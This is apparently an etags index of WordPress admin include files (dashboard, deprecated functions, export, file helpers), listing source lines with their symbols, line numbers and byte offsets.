			$num_items = isset($widget_options['dashboard_incoming_links']['items']) ? $widget_options['dashboard_incoming_links']['items'] : 10;num_items61,2277
		$update = true;update87,4200
		$update = true;update102,4876
		$dashboard_widgets = apply_filters( 'wp_network_dashboard_widgets', array() );dashboard_widgets119,5615
		$dashboard_widgets = apply_filters( 'wp_user_dashboard_widgets', array() );dashboard_widgets122,5770
		$dashboard_widgets = apply_filters( 'wp_dashboard_widgets', array() );dashboard_widgets125,5895
		$name = empty( $wp_registered_widgets[$widget_id]['all_link'] ) ? $wp_registered_widgets[$widget_id]['name'] : $wp_registered_widgets[$widget_id]['name'] . " <a href='{$wp_registered_widgets[$widget_id]['all_link']}' class='edit-box open-box'>" . __('View all') . '</a>';name129,6020
function wp_add_dashboard_widget( $widget_id, $widget_name, $callback, $control_callback = null ) {wp_add_dashboard_widget148,6926
function wp_add_dashboard_widget( $widget_id, $widget_name, $callback, $control_callback = null ) {control_callback148,6926
	$screen = get_current_screen();screen149,7026
		if ( isset( $_GET['edit'] ) && $widget_id == $_GET['edit'] ) {widget_id154,7272
			$callback = '_wp_dashboard_control_callback';callback157,7530
		$side_widgets = array('dashboard_quick_press', 'dashboard_recent_drafts', 'dashboard_primary', 'dashboard_secondary');side_widgets165,7863
		$side_widgets = array('dashboard_primary', 'dashboard_secondary');side_widgets167,8015
		$side_widgets = array();side_widgets169,8090
	$location = 'normal';location171,8118
		$location = 'side';location173,8185
	$priority = 'core';priority175,8208
		$priority = 'high';priority177,8276
function _wp_dashboard_control_callback( $dashboard, $meta_box ) {_wp_dashboard_control_callback182,8387
function wp_dashboard() {wp_dashboard195,8787
	$screen = get_current_screen();screen196,8813
	$class = 'columns-' . get_current_screen()->get_columns();class197,8846
function wp_dashboard_right_now() {wp_dashboard_right_now223,9644
	$num_posts = wp_count_posts( 'post' );num_posts226,9714
	$num_pages = wp_count_posts( 'page' );num_pages227,9754
	$num_cats  = wp_count_terms('category');num_cats229,9795
	$num_tags = wp_count_terms('post_tag');num_tags231,9838
	$num_comm = wp_count_comments( );num_comm233,9880
	$num = number_format_i18n( $num_posts->publish );num240,10086
	$text = _n( 'Post', 'Posts', intval($num_posts->publish) );text241,10137
		$num = "<a href='edit.php'>$num</a>";num243,10241
		$text = "<a href='edit.php'>$text</a>";text244,10281
		$pending_text = sprintf( _n( 'There is <a href="%1$s">%2$s post</a> pending your review.', 'There are <a href="%1$s">%2$s posts</a> pending your review.', $num_posts->pending ), 'edit.php?post_status=pending', number_format_i18n( $num_posts->pending ) );pending_text261,11344
		$pending_text = '';pending_text263,11611
	$num = number_format_i18n( $num_pages->publish );num268,11651
	$text = _n( 'Page', 'Pages', $num_pages->publish );text269,11702
		$num = "<a href='edit.php?post_type=page'>$num</a>";num271,11798
		$text = "<a href='edit.php?post_type=page'>$text</a>";text272,11853
	$num = number_format_i18n( $num_cats );num280,12052
	$text = _n( 'Category', 'Categories', $num_cats );text281,12093
		$num = "<a href='edit-tags.php?taxonomy=category'>$num</a>";num283,12195
		$text = "<a href='edit-tags.php?taxonomy=category'>$text</a>";text284,12258
	$num = number_format_i18n( $num_tags );num292,12457
	$text = _n( 'Tag', 'Tags', $num_tags );text293,12498
		$num = "<a href='edit-tags.php'>$num</a>";num295,12589
		$text = "<a href='edit-tags.php'>$text</a>";text296,12634
	$num = '<span class="total-count">' . number_format_i18n($num_comm->total_comments) . '</span>';num310,13062
	$text = _n( 'Comment', 'Comments', $num_comm->total_comments );text311,13160
		$num = '<a href="edit-comments.php">' . $num . '</a>';num313,13275
		$text = '<a href="edit-comments.php">' . $text . '</a>';text314,13332
	$num = '<span class="approved-count">' . number_format_i18n($num_comm->approved) . '</span>';num322,13545
	$text = _nx( 'Approved', 'Approved', $num_comm->approved, 'Right Now' );text323,13640
		$num = "<a href='edit-comments.php?comment_status=approved'>$num</a>";num325,13764
		$text = "<a class='approved' href='edit-comments.php?comment_status=approved'>$text</a>";text326,13837
	$num = '<span class="pending-count">' . number_format_i18n($num_comm->moderated) . '</span>';num334,14077
	$text = _n( 'Pending', 'Pending', $num_comm->moderated );text335,14172
		$num = "<a href='edit-comments.php?comment_status=moderated'>$num</a>";num337,14281
		$text = "<a class='waiting' href='edit-comments.php?comment_status=moderated'>$text</a>";text338,14355
	$num = number_format_i18n($num_comm->spam);num346,14591
	$text = _nx( 'Spam', 'Spam', $num_comm->spam, 'comment' );text347,14636
		$num = "<a href='edit-comments.php?comment_status=spam'><span class='spam-count'>$num</span></a>";num349,14746
		$text = "<a class='spam' href='edit-comments.php?comment_status=spam'>$text</a>";text350,14847
	$theme = wp_get_theme();theme361,15198
		$sidebars_widgets = wp_get_sidebars_widgets();sidebars_widgets369,15525
		$num_widgets = 0;num_widgets370,15574
		foreach ( (array) $sidebars_widgets as $k => $v ) {k371,15594
				$num_widgets = $num_widgets + count($v);num_widgets375,15768
		$num = number_format_i18n( $num_widgets );num377,15817
		$switch_themes = $theme->display('Name');switch_themes379,15863
			$switch_themes = '<a href="themes.php">' . $switch_themes . '</a>';switch_themes381,15951
		$title = apply_filters('privacy_on_link_title', __('Your site is asking search engines not to index its content') );title397,16981
		$content = apply_filters('privacy_on_link_text', __('Search Engines Blocked') );content398,17100
function wp_network_dashboard_right_now() {wp_network_dashboard_right_now410,17403
	$actions = array();actions411,17447
	$c_users = get_user_count();c_users417,17793
	$c_blogs = get_blog_count();c_blogs418,17823
	$user_text = sprintf( _n( '%s user', '%s users', $c_users ), number_format_i18n( $c_users ) );user_text420,17854
	$blog_text = sprintf( _n( '%s site', '%s sites', $c_blogs ), number_format_i18n( $c_blogs ) );blog_text421,17950
	$sentence = sprintf( __( 'You have %1$s and %2$s.' ), $blog_text, $user_text );sentence423,18047
		foreach ( $actions as $class => $action ) {class427,18181
function wp_dashboard_quick_press() {wp_dashboard_quick_press457,19128
	$drafts = false;drafts460,19185
		$view = get_permalink( $_POST['post_ID'] );view462,19376
		$edit = esc_url( get_edit_post_link( $_POST['post_ID'] ) );edit463,19422
			$drafts_query = new WP_Query( array(drafts_query471,20160
				$drafts =& $drafts_query->posts;drafts481,20421
		$_REQUEST = array(); // hack for get_default_post_to_edit()_REQUEST484,20662
	$last_post_id = (int) get_user_option( 'dashboard_quick_press_last_post_id' ); // Get the last post_IDlast_post_id488,20816
		$post = get_post( $last_post_id );post490,20944
			$post = get_default_post_to_edit('post', true);post492,21082
		$post = get_default_post_to_edit('post', true);post498,21348
	$post_ID = (int) $post->ID;post_ID502,21533
function wp_dashboard_recent_drafts( $drafts = false ) {wp_dashboard_recent_drafts550,23734
function wp_dashboard_recent_drafts( $drafts = false ) {drafts550,23734
		$drafts_query = new WP_Query( array(drafts_query552,23810
		$drafts =& $drafts_query->posts;drafts560,24031
		$list = array();list564,24111
			$url = get_edit_post_link( $draft->ID );url566,24164
			$title = _draft_or_post_title( $draft->ID );title567,24208
			$item = "<h4><a href='$url' title='" . sprintf( __( 'Edit &#8220;%s&#8221;' ), esc_attr( $title ) ) . "'>" . esc_html($title) . "</a> <abbr title='" . get_the_time(__('Y/m/d g:i:s A'), $draft) . "'>" . get_the_time( get_option( 'date_format' ), $draft ) . '</abbr></h4>';item568,24256
			if ( $the_content = preg_split( '#\s#', strip_tags( $draft->post_content ), 11, PREG_SPLIT_NO_EMPTY ) )the_content569,24531
function wp_dashboard_recent_comments() {wp_dashboard_recent_comments589,25101
	$comments = array();comments593,25244
	$start = 0;start594,25266
	$widgets = get_option( 'dashboard_widget_options' );widgets596,25280
	$total_items = isset( $widgets['dashboard_recent_comments'] ) && isset( $widgets['dashboard_recent_comments']['items'] )total_items597,25334
	$comments_query = array( 'number' => $total_items * 5, 'offset' => 0 );comments_query600,25523
	while ( count( $comments ) < $total_items && $possible = get_comments( $comments_query ) ) {possible604,25681
function _wp_dashboard_recent_comments_row( &$comment, $show_date = true ) {_wp_dashboard_recent_comments_row632,26524
function _wp_dashboard_recent_comments_row( &$comment, $show_date = true ) {show_date632,26524
	$comment_post_url = get_edit_post_link( $comment->comment_post_ID );comment_post_url635,26636
	$comment_post_title = strip_tags(get_the_title( $comment->comment_post_ID ));comment_post_title636,26706
	$comment_post_link = "<a href='$comment_post_url'>$comment_post_title</a>";comment_post_link637,26785
	$comment_link = '<a class="comment-link" href="' . esc_url(get_comment_link()) . '">#</a>';comment_link638,26862
	$actions_string = '';actions_string640,26956
		$actions = array(actions643,27102
		$del_nonce = esc_html( '_wpnonce=' . wp_create_nonce( "delete-comment_$comment->comment_ID" ) );del_nonce651,27252
		$approve_nonce = esc_html( '_wpnonce=' . wp_create_nonce( "approve-comment_$comment->comment_ID" ) );approve_nonce652,27351
		$approve_url = esc_url( "comment.php?action=approvecomment&p=$comment->comment_post_ID&c=$comment->comment_ID&$approve_nonce" );approve_url654,27456
		$unapprove_url = esc_url( "comment.php?action=unapprovecomment&p=$comment->comment_post_ID&c=$comment->comment_ID&$approve_nonce" );unapprove_url655,27587
		$spam_url = esc_url( "comment.php?action=spamcomment&p=$comment->comment_post_ID&c=$comment->comment_ID&$del_nonce" );spam_url656,27722
		$trash_url = esc_url( "comment.php?action=trashcomment&p=$comment->comment_post_ID&c=$comment->comment_ID&$del_nonce" );trash_url657,27843
		$delete_url = esc_url( "comment.php?action=deletecomment&p=$comment->comment_post_ID&c=$comment->comment_ID&$del_nonce" );delete_url658,27966
		$actions = apply_filters( 'comment_row_actions', array_filter($actions), $comment );actions670,29694
		$i = 0;i672,29782
		foreach ( $actions as $action => $link ) {action673,29792
			( ( ('approve' == $action || 'unapprove' == $action) && 2 === $i ) || 1 === $i ) ? $sep = '' : $sep = ' | ';sep675,29846
					$type = __( 'Pingback' );type702,30942
					$type = __( 'Trackback' );type705,31008
					$type = ucwords( $comment->comment_type );type708,31066
				$type = esc_html( $type );type710,31129
function wp_dashboard_recent_comments_control() {wp_dashboard_recent_comments_control730,31767
		$widget_options = array();widget_options732,31885
		$number = absint( $_POST['widget-recent-comments']['items'] );number738,32125
	$number = isset( $widget_options['dashboard_recent_comments']['items'] ) ? (int) $widget_options['dashboard_recent_comments']['items'] : '';number743,32325
function wp_dashboard_incoming_links() {wp_dashboard_incoming_links749,32688
function wp_dashboard_incoming_links_output() {wp_dashboard_incoming_links_output758,32912
	$widgets = get_option( 'dashboard_widget_options' );widgets759,32960
	$rss = fetch_feed( $url );rss761,33077
		$items = 10;items782,33726
		$publisher = '';publisher785,33793
		$site_link = '';site_link786,33812
		$link = '';link787,33831
		$content = '';content788,33845
		$date = '';date789,33862
		$link = esc_url( strip_tags( $item->get_link() ) );link790,33876
		$author = $item->get_author();author792,33931
			$site_link = esc_url( strip_tags( $author->get_link() ) );site_link794,33983
				$publisher = __( 'Somebody' );publisher797,34116
		  $publisher = __( 'Somebody' );publisher799,34162
			$publisher = "<a href='$site_link'>$publisher</a>";publisher802,34221
			$publisher = "<strong>$publisher</strong>";publisher804,34283
		$content = $item->get_content();content806,34331
		$content = wp_html_excerpt($content, 50) . ' ...';content807,34366
			$text = __( '%1$s linked here <a href="%2$s">saying</a>, "%3$s"' );text811,34516
			$text = __( '%1$s linked here saying, "%3$s"' );text814,34675
			$date = esc_html( strip_tags( $item->get_date() ) );date820,34911
			$date = strtotime( $date );date821,34967
			$date = gmdate( get_option( 'date_format' ), $date );date822,34998
function wp_dashboard_incoming_links_control() {wp_dashboard_incoming_links_control833,35203
function wp_dashboard_primary() {wp_dashboard_primary837,35388
function wp_dashboard_primary_control() {wp_dashboard_primary_control841,35508
function wp_dashboard_rss_output( $widget_id ) {wp_dashboard_rss_output852,35703
	$widgets = get_option( 'dashboard_widget_options' );widgets853,35752
function wp_dashboard_secondary() {wp_dashboard_secondary859,35906
function wp_dashboard_secondary_control() {wp_dashboard_secondary_control863,36036
function wp_dashboard_secondary_output() {wp_dashboard_secondary_output874,36232
	$widgets = get_option( 'dashboard_widget_options' );widgets875,36275
	$rss = @fetch_feed( $url );rss877,36387
function wp_dashboard_plugins() {wp_dashboard_plugins898,36912
function wp_dashboard_plugins_output() {wp_dashboard_plugins_output910,37274
	$popular = fetch_feed( 'http://wordpress.org/extend/plugins/rss/browse/popular/' );popular911,37315
	$new     = fetch_feed( 'http://wordpress.org/extend/plugins/rss/browse/new/' );new912,37400
	if ( false === $plugin_slugs = get_transient( 'plugin_slugs' ) ) {plugin_slugs914,37482
		$plugin_slugs = array_keys( get_plugins() );plugin_slugs915,37550
	foreach ( array( 'popular' => __('Most Popular'), 'new' => __('Newest Plugins') ) as $feed => $label ) {feed919,37658
		$items = $$feed->get_items(0, 5);items923,37839
			$item_key = array_rand($items);item_key931,38062
			$item = $items[$item_key];item932,38097
			$link = esc_url($link);link936,38188
				$slug = $matches[1];slug938,38273
				if ( $slug == substr( $plugin_slug, 0, strlen( $slug ) ) ) {slug947,38506
		while ( ( null !== $item_key = array_rand($items) ) && false !== strpos( $items[$item_key]->get_description(), 'Plugin Name:' ) )item_key958,38807
			$title = $matches[1];title966,39158
			$title = $item->get_title();title968,39247
		$title = esc_html( $title );title969,39279
		$description = esc_html( strip_tags(@html_entity_decode($item->get_description(), ENT_QUOTES, get_option('blog_charset'))) );description971,39311
		$ilink = wp_nonce_url('plugin-install.php?tab=plugin-information&plugin=' . $slug, 'install-plugin_' . $slug) .ilink973,39440
 * widget options of $widget_id. If cached, call $callback, a function thatthat989,40018
function wp_dashboard_cached_rss_widget( $widget_id, $callback, $check_urls = array() ) {wp_dashboard_cached_rss_widget1000,40416
function wp_dashboard_cached_rss_widget( $widget_id, $callback, $check_urls = array() ) {check_urls1000,40416
	$loading = '<p class="widget-loading hide-if-no-js">' . __( 'Loading&#8230;' ) . '</p><p class="hide-if-js">' . __( 'This widget requires JavaScript.' ) . '</p>';loading1001,40506
	$doing_ajax = ( defined('DOING_AJAX') && DOING_AJAX );doing_ajax1002,40670
		$widgets = get_option( 'dashboard_widget_options' );widgets1005,40756
		$check_urls = array( $widgets[$widget_id]['url'] );check_urls1010,40913
	$cache_key = 'dash_' . md5( $widget_id );cache_key1013,40971
	if ( false !== ( $output = get_transient( $cache_key ) ) ) {output1014,41014
		$args = array_slice( func_get_args(), 2 );args1025,41220
function wp_dashboard_trigger_widget_control( $widget_control_id = false ) {wp_dashboard_trigger_widget_control1045,41682
function wp_dashboard_trigger_widget_control( $widget_control_id = false ) {widget_control_id1045,41682
function wp_dashboard_rss_control( $widget_id, $form_inputs = array() ) {wp_dashboard_rss_control1064,42413
function wp_dashboard_rss_control( $widget_id, $form_inputs = array() ) {form_inputs1064,42413
		$widget_options = array();widget_options1066,42555
	$number = 1; // Hack to use wp_widget_rss_form()number1071,42671
			$rss = fetch_feed($widget_options[$widget_id]['url']);rss1079,43185
		$cache_key = 'dash_' . md5( $widget_id );cache_key1089,43564
function wp_dashboard_quota() {wp_dashboard_quota1097,43757
	$quota = get_space_allowed();quota1101,43918
	$used = get_dirsize( BLOGUPLOADDIR ) / 1024 / 1024;used1102,43949
		$percentused = '100';percentused1105,44026
		$percentused = ( $used / $quota ) * 100;percentused1107,44056
	$used_color = ( $percentused >= 70 ) ? ' spam' : '';used_color1108,44099
	$used = round( $used, 2 );used1109,44153
	$percentused = number_format( $percentused );percentused1110,44181
function wp_dashboard_browser_nag() {wp_dashboard_browser_nag1136,45140
	$notice = '';notice1137,45178
	$response = wp_check_browser_version();response1138,45193
			$msg = sprintf( __( "It looks like you're using an insecure version of <a href='%s'>%s</a>. Using an outdated browser makes your computer unsafe. For the best WordPress experience, please update your browser." ), esc_attr( $response['update_url'] ), esc_html( $response['name'] ) );msg1142,45288
			$msg = sprintf( __( "It looks like you're using an old version of <a href='%s'>%s</a>. For the best WordPress experience, please update your browser." ), esc_attr( $response['update_url'] ), esc_html( $response['name'] ) );msg1144,45585
		$browser_nag_class = '';browser_nag_class1147,45817
			$img_src = ( is_ssl() && ! empty( $response['img_src_ssl'] ) )? $response['img_src_ssl'] : $response['img_src'];img_src1149,45886
			$browser_nag_class = ' has-browser-icon';browser_nag_class1152,46169
		$browsehappy = 'http://browsehappy.com/';browsehappy1156,46296
		$locale = get_locale();locale1157,46340
			$browsehappy = add_query_arg( 'locale', $locale, $browsehappy );browsehappy1159,46395
function dashboard_browser_nag_class( $classes ) {dashboard_browser_nag_class1169,46955
	$response = wp_check_browser_version();response1170,47006
function wp_check_browser_version() {wp_check_browser_version1185,47296
	$key = md5( $_SERVER['HTTP_USER_AGENT'] );key1189,47396
		$options = array(options1194,47537
		$response = wp_remote_post( 'http://api.wordpress.org/core/browse-happy/1.0/', $options );response1199,47697
		$response = maybe_unserialize( wp_remote_retrieve_body( $response ) );response1215,48478
 * Empty function usable by plugins to output empty dashboard widget (to be populated later by JS).usable1227,48715
function wp_dashboard_empty() {}wp_dashboard_empty1229,48819
function wp_welcome_panel() {wp_welcome_panel1236,48941
	$classes = 'welcome-panel';classes1242,49055
	$option = get_user_meta( get_current_user_id(), 'show_welcome_panel', true );option1244,49085
	$hide = 0 == $option || ( 2 == $option && wp_get_current_user()->user_email != get_option( 'admin_email' ) );hide1246,49247
		$theme = wp_get_theme();theme1284,52333
			$customize_links = array();customize_links1290,52558

wordpress/wp-admin/includes/deprecated.php,9903
function tinymce_include() {tinymce_include21,398
function documentation_link() {documentation_link34,581
function wp_shrink_dimensions( $width, $height, $wmax = 128, $hmax = 96 ) {wp_shrink_dimensions52,1065
function wp_shrink_dimensions( $width, $height, $wmax = 128, $hmax = 96 ) {wmax52,1065
function dropdown_categories( $default = 0, $parent = 0, $popular_ids = array() ) {dropdown_categories69,1551
function dropdown_categories( $default = 0, $parent = 0, $popular_ids = array() ) {default69,1551
function dropdown_link_categories( $default = 0 ) {dropdown_link_categories85,1975
function dropdown_link_categories( $default = 0 ) {default85,1975
function wp_dropdown_cats( $currentcat = 0, $currentparent = 0, $parent = 0, $level = 0, $categories = 0 ) {wp_dropdown_cats106,2525
function wp_dropdown_cats( $currentcat = 0, $currentparent = 0, $parent = 0, $level = 0, $categories = 0 ) {currentcat106,2525
		$categories = get_categories( array('hide_empty' => 0) );categories109,2728
			if ( $currentcat != $category->term_id && $parent == $category->parent) {parent113,2852
				$pad = str_repeat( '&#8211; ', $level );pad114,2929
				if ( $currentparent == $category->term_id )currentparent117,3076
 * @param unknown_type $sanitize_callback A callback function that sanitizes the option's value.that139,3785
function add_option_update_handler( $option_group, $option_name, $sanitize_callback = '' ) {add_option_update_handler142,3905
function add_option_update_handler( $option_group, $option_name, $sanitize_callback = '' ) {sanitize_callback142,3905
function remove_option_update_handler( $option_group, $option_name, $sanitize_callback = '' ) {remove_option_update_handler160,4424
function remove_option_update_handler( $option_group, $option_name, $sanitize_callback = '' ) {sanitize_callback160,4424
function codepress_get_lang( $filename ) {codepress_get_lang173,4819
function codepress_footer_js() {codepress_footer_js184,5048
function use_codepress() {use_codepress195,5224
function get_author_user_ids() {get_author_user_ids205,5376
		$level_key = $wpdb->get_blog_prefix() . 'user_level';level_key210,5510
		$level_key = $wpdb->get_blog_prefix() . 'capabilities'; // wpmu site admins don't have user_levelslevel_key212,5572
function get_editable_authors( $user_id ) {get_editable_authors223,5952
	$editable = get_editable_user_ids( $user_id );editable228,6074
		$editable = join(',', $editable);editable233,6170
		$authors = $wpdb->get_results( "SELECT * FROM $wpdb->users WHERE ID IN ($editable) ORDER BY display_name" );authors234,6206
function get_editable_user_ids( $user_id, $exclude_zeros = true, $post_type = 'post' ) {get_editable_user_ids247,6547
function get_editable_user_ids( $user_id, $exclude_zeros = true, $post_type = 'post' ) {exclude_zeros247,6547
	$user = new WP_User( $user_id );user252,6714
	$post_type_obj = get_post_type_object($post_type);post_type_obj253,6748
		$level_key = $wpdb->get_blog_prefix() . 'user_level';level_key263,7027
		$level_key = $wpdb->get_blog_prefix() . 'capabilities'; // wpmu site admins don't have user_levelslevel_key265,7089
	$query = $wpdb->prepare("SELECT user_id FROM $wpdb->usermeta WHERE meta_key = %s", $level_key);query267,7191
function get_nonauthor_user_ids() {get_nonauthor_user_ids277,7416
		$level_key = $wpdb->get_blog_prefix() . 'user_level';level_key283,7554
		$level_key = $wpdb->get_blog_prefix() . 'capabilities'; // wpmu site admins don't have user_levelslevel_key285,7616
class WP_User_Search {WP_User_Search297,7976
	var $results;results306,8110
	var $search_term;search_term315,8236
	var $page;page324,8337
	var $role;role333,8448
	var $raw_page;raw_page342,8551
	var $users_per_page = 50;users_per_page351,8672
	var $users_per_page = 50;users_per_page351,8672
	var $first_user;first_user360,8810
	var $last_user;last_user369,8930
	var $query_limit;query_limit378,9052
	var $query_orderby;query_orderby387,9176
	var $query_from;query_from396,9302
	var $query_where;query_where405,9425
	var $total_users_for_query = 0;total_users_for_query414,9546
	var $total_users_for_query = 0;total_users_for_query414,9546
	var $too_many_total_users = false;too_many_total_users423,9682
	var $too_many_total_users = false;too_many_total_users423,9682
	var $search_errors;search_errors432,9829
	var $paging_text;paging_text441,9961
	function WP_User_Search ($search_term = '', $page = '', $role = '') {WP_User_Search453,10224
	function WP_User_Search ($search_term = '', $page = '', $role = '') {page453,10224
		$this->search_term = stripslashes( $search_term );search_term456,10360
		$this->raw_page = ( '' == $page ) ? false : (int) $page;raw_page457,10413
		$this->page = (int) ( '' == $page ) ? 1 : $page;page458,10472
		$this->role = $role;role459,10523
	function prepare_query() {prepare_query475,10800
		$this->first_user = ($this->page - 1) * $this->users_per_page;first_user477,10844
		$this->query_limit = $wpdb->prepare(" LIMIT %d, %d", $this->first_user, $this->users_per_page);query_limit479,10910
		$this->query_orderby = ' ORDER BY user_login';query_orderby480,11008
		$search_sql = '';search_sql482,11058
			$searches = array();searches484,11108
			$search_sql = 'AND (';search_sql485,11132
		$this->query_from = " FROM $wpdb->users";query_from492,11434
		$this->query_where = " WHERE 1=1 $search_sql";query_where493,11478
			$level_key = $wpdb->prefix . 'capabilities'; // wpmu site admins don't have user_levelslevel_key499,11853
	function query() {query515,12303
		$this->results = $wpdb->get_col("SELECT DISTINCT($wpdb->users.ID)" . $this->query_from . $this->query_where . $this->query_orderby . $this->query_limit);results518,12340
			$this->total_users_for_query = $wpdb->get_var("SELECT COUNT(DISTINCT($wpdb->users.ID))" . $this->query_from . $this->query_where); // no limittotal_users_for_query521,12521
			$this->search_errors = new WP_Error('no_matching_users_found', __('No matching users were found!'));search_errors523,12674
	function prepare_vars_for_template_usage() {prepare_vars_for_template_usage534,12921
		$this->search_term = stripslashes($this->search_term); // done with DB, from now on we want slashes gonesearch_term535,12967
	function do_paging() {do_paging546,13217
			$args = array();args548,13333
			$this->paging_text = paginate_links( array(paging_text554,13522
				$this->paging_text = sprintf( '<span class="displaying-num">' . __( 'Displaying %s&#8211;%s of %s' ) . '</span>%s',paging_text562,13801
	function get_results() {get_results582,14362
	function page_links() {page_links594,14548
	function results_are_paged() {results_are_paged608,14751
	function is_search() {is_search622,14954
function get_others_unpublished_posts($user_id, $type='any') {get_others_unpublished_posts639,15338
function get_others_unpublished_posts($user_id, $type='any') {type639,15338
	$editable = get_editable_user_ids( $user_id );editable644,15464
		$type_sql = " post_status = '$type' ";type_sql647,15564
		$type_sql = " ( post_status = 'draft' OR post_status = 'pending' ) ";type_sql649,15611
	$dir = ( 'pending' == $type ) ? 'ASC' : 'DESC';dir651,15684
		$other_unpubs = '';other_unpubs654,15755
		$editable = join(',', $editable);editable656,15787
		$other_unpubs = $wpdb->get_results( $wpdb->prepare("SELECT ID, post_title, post_author FROM $wpdb->posts WHERE post_type = 'post' AND $type_sql AND post_author IN ($editable) AND post_author != %d ORDER BY post_modified $dir", $user_id) );other_unpubs657,15823
function get_others_drafts($user_id) {get_others_drafts671,16285
function get_others_pending($user_id) {get_others_pending685,16628
function wp_dashboard_quick_press_output() {wp_dashboard_quick_press_output699,16949
function wp_tiny_mce( $teeny = false, $settings = false ) {wp_tiny_mce710,17196
function wp_tiny_mce( $teeny = false, $settings = false ) {teeny710,17196
	static $num = 1;num713,17318
	static $num = 1;num713,17318
	$editor_id = 'content' . $num++;editor_id718,17437
	$set = array(set720,17472
	$set = _WP_Editors::parse_settings($editor_id, $set);set726,17581
function wp_preload_dialogs() {wp_preload_dialogs735,17768
function wp_print_editor_js() {wp_print_editor_js744,17944
function wp_quicktags() {wp_quicktags753,18120
function screen_layout( $screen ) {screen_layout765,18397
	$current_screen = get_current_screen();current_screen768,18523
function screen_options( $screen ) {screen_options786,18884
	$current_screen = get_current_screen();current_screen789,19014
function screen_meta( $screen ) {screen_meta807,19356
	$current_screen = get_current_screen();current_screen808,19390
function favorite_actions() {favorite_actions818,19601
function media_upload_image() {media_upload_image822,19696
function media_upload_audio() {media_upload_audio827,19842
function media_upload_video() {media_upload_video832,19988
function media_upload_file() {media_upload_file837,20134
function type_url_form_image() {type_url_form_image842,20279
function type_url_form_audio() {type_url_form_audio847,20444
function type_url_form_video() {type_url_form_video852,20609
function type_url_form_file() {type_url_form_file857,20774
function add_contextual_help( $screen, $help ) {add_contextual_help875,21346
		$screen = convert_to_screen( $screen );screen879,21511
function get_allowed_themes() {get_allowed_themes894,21816
	$themes = wp_get_themes( array( 'allowed' => true ) );themes897,21942
	$wp_themes = array();wp_themes899,21999
function get_broken_themes() {get_broken_themes914,22219
	$themes = wp_get_themes( array( 'errors' => true ) );themes917,22341
	$broken = array();broken918,22396
		$name = $theme->get('Name');name920,22449
function current_theme_info() {current_theme_info937,22727

wordpress/wp-admin/includes/export.php,4034
define( 'WXR_VERSION', '1.2' );WXR_VERSION16,249
function export_wp( $args = array() ) {export_wp25,435
function export_wp( $args = array() ) {args25,435
	$defaults = array( 'content' => 'all', 'author' => false, 'category' => false,defaults28,498
	$args = wp_parse_args( $args, $defaults );args31,647
	$sitename = sanitize_key( get_bloginfo( 'name' ) );sitename35,720
	$filename = $sitename . 'wordpress.' . date( 'Y-m-d' ) . '.xml';filename37,818
		$ptype = get_post_type_object( $args['content'] );ptype44,1164
		$where = $wpdb->prepare( "{$wpdb->posts}.post_type = %s", $args['content'] );where48,1278
		$post_types = get_post_types( array( 'can_export' => true ) );post_types50,1368
		$esses = array_fill( 0, count($post_types), '%s' );esses51,1433
		$where = $wpdb->prepare( "{$wpdb->posts}.post_type IN (" . implode( ',', $esses ) . ')', $post_types );where52,1487
	$join = '';join60,1842
		if ( $term = term_exists( $args['category'], 'category' ) ) {term62,1913
			$join = "INNER JOIN {$wpdb->term_relationships} ON ({$wpdb->posts}.ID = {$wpdb->term_relationships}.object_id)";join63,1977
	$post_ids = $wpdb->get_col( "SELECT ID FROM {$wpdb->posts} $join WHERE $where" );post_ids80,2792
	$cats = $tags = $terms = array();cats83,2966
		$cat = get_term( $term['term_id'], 'category' );cat85,3035
		$cats = array( $cat->term_id => $cat );cats86,3086
		$categories = (array) get_categories( array( 'get' => 'all' ) );categories89,3195
		$tags = (array) get_tags( array( 'get' => 'all' ) );tags90,3262
		$custom_taxonomies = get_taxonomies( array( '_builtin' => false ) );custom_taxonomies92,3318
		$custom_terms = (array) get_terms( $custom_taxonomies, array( 'get' => 'all' ) );custom_terms93,3389
		while ( $cat = array_shift( $categories ) ) {cat96,3541
		while ( $t = array_shift( $custom_terms ) ) {t104,3783
	function wxr_cdata( $str ) {wxr_cdata122,4170
			$str = utf8_encode( $str );str124,4237
		// $str = ent2ncr(esc_html($str));str126,4269
		$str = '<![CDATA[' . str_replace( ']]>', ']]]]><![CDATA[>', $str ) . ']]>';str127,4306
	function wxr_site_url() {wxr_site_url139,4499
	function wxr_cat_name( $category ) {wxr_cat_name155,4810
	function wxr_category_description( $category ) {wxr_category_description169,5122
	function wxr_tag_name( $tag ) {wxr_tag_name183,5457
	function wxr_tag_description( $tag ) {wxr_tag_description197,5734
	function wxr_term_name( $term ) {wxr_term_name211,6043
	function wxr_term_description( $term ) {wxr_term_description225,6330
	function wxr_authors_list() {wxr_authors_list237,6587
		$authors = array();authors240,6635
		$results = $wpdb->get_results( "SELECT DISTINCT post_author FROM $wpdb->posts" );results241,6657
		$authors = array_filter( $authors );authors245,6838
	function wxr_nav_menu_terms() {wxr_nav_menu_terms264,7550
		$nav_menus = wp_get_nav_menus();nav_menus265,7583
	function wxr_post_taxonomy() {wxr_post_taxonomy281,8041
		$taxonomies = get_object_taxonomies( $post->post_type );taxonomies284,8090
		$terms = wp_get_object_terms( $post->ID, $taxonomies );terms287,8190
	function wxr_filter_postmeta( $return_me, $meta_key ) {wxr_filter_postmeta294,8424
			$return_me = true;return_me296,8516
	while ( $next_posts = array_splice( $post_ids, 0, 20 ) ) {next_posts360,11979
	$where = 'WHERE ID IN (' . join( ',', $next_posts ) . ')';where361,12039
	$posts = $wpdb->get_results( "SELECT * FROM {$wpdb->posts} $where" );posts362,12099
		$is_sticky = is_sticky( $post->ID ) ? 1 : 0;is_sticky367,12244
<?php	$postmeta = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->postmeta WHERE post_id = %d", $post->ID ) );postmeta394,13945
<?php	$comments = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->comments WHERE comment_post_ID = %d AND comment_approved <> 'spam'", $post->ID ) );comments404,14400
<?php		$c_meta = $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $wpdb->commentmeta WHERE comment_id = %d", $c->comment_ID ) );c_meta419,15587

wordpress/wp-admin/includes/file.php,13362
$wp_file_descriptions = array(wp_file_descriptions10,181
function get_file_description( $file ) {get_file_description56,1996
		$template_data = implode( '', file( $file ) );template_data63,2238
function get_home_path() {get_home_path79,2691
	$home = get_option( 'home' );home80,2718
	$siteurl = get_option( 'siteurl' );siteurl81,2749
		$wp_path_rel_to_home = str_replace($home, '', $siteurl); /* $siteurl - $home */wp_path_rel_to_home83,2829
		$pos = strrpos($_SERVER["SCRIPT_FILENAME"], $wp_path_rel_to_home);pos84,2911
